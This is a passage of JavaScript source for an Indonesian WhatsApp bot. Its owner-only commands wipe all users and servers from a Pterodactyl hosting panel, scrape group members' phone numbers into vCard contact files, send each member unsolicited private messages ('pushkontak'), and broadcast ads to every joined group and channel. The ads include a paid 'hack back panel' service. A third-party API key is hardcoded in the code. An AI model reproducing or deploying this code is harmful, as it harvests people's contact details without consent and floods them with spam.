 } else {
 for (let user of users) {
 let u = user.attributes;

 // Jika ID admin ada di daftar pengecualian, lewati proses penghapusan
 if (excludedAdminIds.includes(u.id.toString())) {
 Reply(`*Admin dengan ID ${u.id} (${u.username}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus user
 let deleteUser = await fetch(global.domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 if (deleteUser.ok) {
 Reply(`*Berhasil menghapus user dengan ID: ${u.id} (${u.username})*`);
 } else {
 let errorText = await deleteUser.text();
 Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 Reply('*Proses penghapusan admin selesai!*');
 }

 } catch (error) {
 Reply('Terjadi kesalahan: ' + error.message);
 }
 break;

}

case 'delpanelall': {
if (!isCreator) return Reply(mess.owner)
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return Reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .delpanelall , 101, 102, 103');
    }

    try {
        // Mendapatkan daftar server
        let f = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return Reply('Tidak ada server yang ditemukan.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                Reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteServer.ok) {
                Reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        Reply('*Semua server berhasil dihapus kecuali yang dikecualikan!*');
    } catch (error) {
        return Reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

//================================================================================

case "plooo": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(example("idgrupnya"))
let res = await TamaMods.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./Access/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer TamaMods - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Access/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
Reply(err.toString())
} finally {
if (m.chat !== m.sender) await Reply(`*Succes Create File Kontak*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await TamaMods.sendMessage(m.sender, { document: fs.readFileSync("./Access/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: pantek })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Access/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Access/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./Access/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer TamaMods - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Access/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
Reply(err.toString())
} finally {
if (m.chat !== m.sender) await Reply(`*Berhasil membuat file kontak*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await TamaMods.sendMessage(m.sender, { document: fs.readFileSync("./Access/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: pantek })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Access/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Access/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return Reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return Reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return Reply("Format Delay Tidak Valid")
if (!teks) return Reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await TamaMods.groupMetadata(`${idnya}`)
} catch (e) {
return Reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
Reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Access/database/contacts.json', JSON.stringify(contacts))
await TamaMods.sendMessage(mem, {text: teks}, {quoted: qlocPush})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${namaowner}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Access/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
Reply(err.toString())
} finally {
if (m.chat !== m.sender) await Reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await TamaMods.sendMessage(m.sender, { document: fs.readFileSync("./Access/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: pantek })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Access/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Access/database/contacts.vcf", "")
}}
break
//------(Batas Case)------//
case "pushkontak1": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return Reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await TamaMods.groupMetadata(`${idnya}`)
} catch (e) {
return Reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
Reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Access/database/contacts.json', JSON.stringify(contacts))
await TamaMods.sendMessage(mem, {text: teks}, {quoted: qlocPush})
await sleep(global.delayPushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${namaowner}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Access/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
Reply(err.toString())
} finally {
if (m.chat !== m.sender) await Reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await TamaMods.sendMessage(m.sender, { document: fs.readFileSync("./Access/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: pantek })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Access/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Access/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak3": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return Reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text.split("|")[0]
var teks = text.split("|")[1]
var groupMetadataa
try {
groupMetadataa = await TamaMods.groupMetadata(`${idnya}`)
} catch (e) {
return Reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
Reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Access/database/contacts.vcf', JSON.stringify(contacts))
let msgii = generateWAMessageFromContent(mem, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"KLIK INI BUAT SAVE WA KU\",\"url\":\"https://wa.me//${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qlocPush}) 
await TamaMods.relayMessage(mem,msgii.message, { 
messageId: msgii.key.id 
})
await sleep(3000)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${namaowner}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Access/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
Reply(err.toString())
} finally {
if (m.chat !== m.sender) await Reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await TamaMods.sendMessage(m.sender, { document: fs.readFileSync("./Access/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: pantek })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Access/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Access/database/contacts.vcf", "")
}}
break


case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(example("pesannya"))
const meta = await TamaMods.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname2}\nPush Kontak`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await TamaMods.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await Reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await TamaMods.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await TamaMods.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return Reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return Reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./Access/database/listidch.json", JSON.stringify(listidch, null, 2))
Reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return Reply("Tidak ada id channel di database")
if (!text) return Reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./Access/database/listidch.json", JSON.stringify(listidch))
return Reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return Reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return Reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./Access/database/listidch.json", JSON.stringify(listidch, null, 2))
Reply(`Berhasil menghapus id channel dari database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listch": {
if (listidch.length < 1) return Reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
TamaMods.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "jpmchfoto": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply("Balas/kirim foto dengan teks");
    if (!/image/.test(mime)) return Reply("Format salah! Balas/kirim foto dengan teks.");
    
    let image = await TamaMods.downloadAndSaveMediaMessage(qmsg);
    const daftarSaluran = [
        "120363333324119584@newsletter",
        "120363359546649119@newsletter",
    ];
    let total = 0;

    Reply(`Memproses Mengirim Pesan Teks & Foto Ke ${daftarSaluran.length} Saluran...`);
    
    for (const idSaluran of daftarSaluran) {
        try {
            await TamaMods.sendMessage(idSaluran, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: { forwardingScore: 1, isForwarded: true },
            });
            total++;
        } catch (err) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, err);
        }
        await sleep(global.delayjpmch); // Delay antara pesan
    }

    await fs.unlinkSync(image);
    Reply(`Berhasil Mengirim Pesan Ke ${total} Saluran`);
}
break;

case "jpmallch": case "jpmch": {
    if (!isCreator) return Reply(mess.owner) // Periksa apakah pengguna adalah creator
 if (!text) return Reply(example("teksnya")); // Periksa apakah teks tersedia
 
 // Daftar saluran WhatsApp (array berisi ID saluran WhatsApp)
 const daftarSaluran = [
"120363333324119584@newsletter",
        "120363359546649119@newsletter",
 ];

 // Kirim pesan ke semua saluran dalam daftar
 for (const idSaluran of daftarSaluran) {
 try {
 await TamaMods.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
 } catch (error) {
 console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
 }
 }
 Reply("*DONE JPM KE SEMUA CH*");
}
break
//------(Batas Case)------//
case "jpmallch2": {
    if (!isCreator) return Reply(mess.owner) // Periksa apakah pengguna adalah creator
    if (!text) return Reply("Format: Jpmallch2 jumlah_pesan|waktu|teks");

    // Memisahkan parameter
    const [jumlahPesan, waktu, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali
    const daftarSaluran = [
        "120363333324119584@newsletter",
        "120363359546649119@newsletter",
    ];

    // Validasi parameter
    if (!jumlahPesan || isNaN(jumlahPesan) || !waktu || isNaN(waktu) || !teks) {
        return Reply("Format salah! Gunakan: Jpmallch2 jumlah_pesan|waktu|teks");
    }

    const jumlah = parseInt(jumlahPesan);
    const interval = parseInt(waktu) * 60 * 1000; // Konversi menit ke milidetik

    Reply(`*Mengirim ${jumlah} pesan setiap ${waktu} menit ke daftar saluran...*`);

    let counter = 0;

    // Fungsi pengiriman pesan dengan interval
    const pengirimanPesan = setInterval(async () => {
        if (counter >= jumlah) {
            clearInterval(pengirimanPesan); // Hentikan pengiriman setelah selesai
            return Reply("*DONE JPM KE SEMUA CH 😜🤙🏻*");
        }

        for (const idSaluran of daftarSaluran) {
            try {
                await TamaMods.sendMessage(idSaluran, { text: teks });
            } catch (error) {
                console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
            }
        }

        counter++;
    }, interval);
}
break;

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await TamaMods.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await Reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await TamaMods.sendMessage(jid, {text: `*Jpm Telah Selesai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: pantek})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await TamaMods.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await Reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await TamaMods.sendMessage(jid, {text: `*Jpm Telah Selsai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: pantek})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("teksnya"))
let allgrup = await TamaMods.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await Reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await TamaMods.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await TamaMods.sendMessage(jid, {text: `*Jpm Telah Selesai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: pantek})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return Reply(example("teks dengan mengirim foto"))
const allgrup = await TamaMods.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await TamaMods.downloadAndSaveMediaMessage(qmsg)
await Reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await TamaMods.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await TamaMods.sendMessage(jid, {text: `*Jpm Telah Selesai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: pantek})
}
break

//================================================================================
case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return Reply(example("teks dengan mengirim foto"))
const allgrup = await TamaMods.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await TamaMods.downloadAndSaveMediaMessage(qmsg)
await Reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await TamaMods.sendMessage(i, {
  footer: `${botname2}\nJpm Testimoni`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Layanan',
          sections: [
            {
              title: 'List Layanan',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Reseller Panel Pterodactyl',
                  id: '.buyresellerpanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps Digital Ocean',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                },
                {
                  title: 'Jasa Install Theme',
                  id: '.jasainstalltema'
                },
                {
                  title: 'Jasa Hack Back Panel',
                  id: '.jasahbpanel'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `${teks}`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await TamaMods.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return Reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return Reply(example("teks dengan mengirim foto"))
const allgrup = await TamaMods.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await TamaMods.downloadAndSaveMediaMessage(qmsg)
await Reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await TamaMods.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await TamaMods.sendMessage(i, {
  footer: `${botname2}\nSend Testimoni`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Reseller Panel Pterodactyl',
                  id: '.buyresellerpanel'
                },
                {
                  title: 'Jasa Hack Back Panel',
                  id: '.jasahbpanel'
                },
                {
                  title: 'Jasa install thema',
                  id: '.jasainstalltema'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps Digital Ocean',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `${teks}`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await TamaMods.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: pantek})
}
break
//------(Batas Case)------//
case 'mlstalk': {
     if (!text || !text.split("|")) return Reply(example("id|zone"));
 let vii = text.split("|");
 
 let id = vii[0].trim(); 
 let zone = vii[1].trim(); 

    try {
        let epep = await fetchJson(`https://api.neoxr.eu/api/gname-ml?id=${id}&zone=${zone}&apikey=zakkigans12`);
        let caption = `*MOBILE LEGENDS STALK*\nid : ${id}\nzone : ${zone}\nNickName : ${epep.data.username}`;

        Reply(caption);
    } catch (err) {
        Reply('Username Tidak Ditemukan.');
    }
}
break;

case 'ffstalk': {
    if (!text) return Reply(`Contoh: ${prefix+command} id`);
    if (isNaN(text)) return Reply(`ID harus berupa angka!`);

    try {
        let epep = await fetchJson(`https://api.neoxr.eu/api/gname-ff?id=${text}&apikey=zakkigans12`);
        let caption = `*FREE FIRE STALK*\nid : ${text}\nNickName : ${epep.data.username}`;

        Reply(caption);
    } catch (err) {
        Reply('Username Tidak Ditemukan.');
    }
}
break;

//================================================================================

case "pay": case "payment": case "qris": {
await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nALL PAYMENT`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },              
                {
                  title: 'GOPAY',
                  id: '.gopay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama\n"
}, {quoted: qtext2})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaowner}*

* *Nomor :* ${global.dana}
* *Atas Nama :* ${global.namadana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await TamaMods.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break
//------(Batas Case)------//
case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaowner}*

* *Nomor :* ${global.gopay}
* *Atas Nama :* ${global.namagopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await TamaMods.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//================================================================================



//================================================================================

case "ambilq": case "q": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
Reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Channel :*
${linkChannel}`
await TamaMods.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk🔥`, 
body: `© Powered By ${namaowner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: pantek})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("vps r16 c4"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await TamaMods.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done⚡`, 
body: `Powered By ${namaowner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: pantek})
}
break


//================================================================================

case "depeloperrbot": case "depeloperr": {
await TamaMods.sendContact(m.chat, [global.owner], pantek)
}
break
//------(Batas Case)------//
case "owner":
			case "developerbot": {
				let namaown = `𝐓𝐚𝐦𝐚𝐚 ϟ`
				var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"contactMessage": {
						"displayName": `${namaown}`,
